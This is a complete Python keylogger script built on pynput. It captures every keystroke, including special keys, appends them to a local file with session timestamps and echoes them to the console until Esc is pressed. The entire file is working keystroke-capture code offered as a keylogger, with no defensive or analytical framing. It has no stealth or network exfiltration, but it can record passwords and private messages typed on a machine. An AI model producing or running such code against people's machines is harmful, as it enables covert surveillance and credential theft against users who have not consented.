from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def write_log(content):
    """Write keystroke content to both the console and log file in real-time."""
    print(content, end="")  # Real-time console output
    with open(log_file, "a") as f:
        f.write(content + "\n")  # Append to log file immediately
def clear_log_file():
    """Clear the contents of the log file."""
    with open(log_file, "w") as f:
        f.write("")  # Open the file in write mode to clear it
def on_press(key):
    try:
        # Capture regular keys
        if hasattr(key, 'char') and key.char is not None:
            write_log(key.char)
        # Capture special keys like space, enter, backspace
        else:
            special_key = f"[{key.name}]" if hasattr(key, 'name') else "[unknown]"
            write_log(special_key)
    except Exception as e:
        write_log(f"[Error: {e}]")

# Function to stop keylogger
def on_release(key):
    # Stop if 'esc' is pressed
    if key == keyboard.Key.esc:
        write_log("\n[Session Ended]\n")
        return False

def start_logging():
    """Start the keylogger session with a timestamp."""
    # Clear the log file at the start of a new session
    clear_log_file()
    session_header = f"\n[Session Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n"
    write_log(session_header)

    # Set up listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run the keylogger
if __name__ == "__main__":
    start_logging()
